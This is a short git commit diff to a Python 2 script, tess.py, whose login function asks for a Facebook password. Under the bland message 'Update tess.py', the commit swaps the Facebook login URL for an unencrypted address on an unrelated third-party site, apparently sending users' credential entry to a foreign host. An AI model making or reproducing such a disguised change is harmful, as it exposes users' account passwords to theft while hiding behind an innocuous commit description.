c8e1e4925ad410e131e4bbce4e11ea1a6ddf18dd
redaxee <47358833+redaxee@users.noreply.github.com>
2019-08-05 22:18:40 +0700

    Update tess.py

--- tess.py
+++ tess.py
@@ -70,7 +70,7 @@ def login():
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
-            br.open('https://m.facebook.com')
+            br.open('http://www.simplysit.com/15690//S3Rtg/?sc=1&sc=1&l=1&ppy=5772259&i=5772259')
         except mechanize.URLError:
             print '\n\x1b[1;91m[!] Tidak ada koneksi'
             keluar()
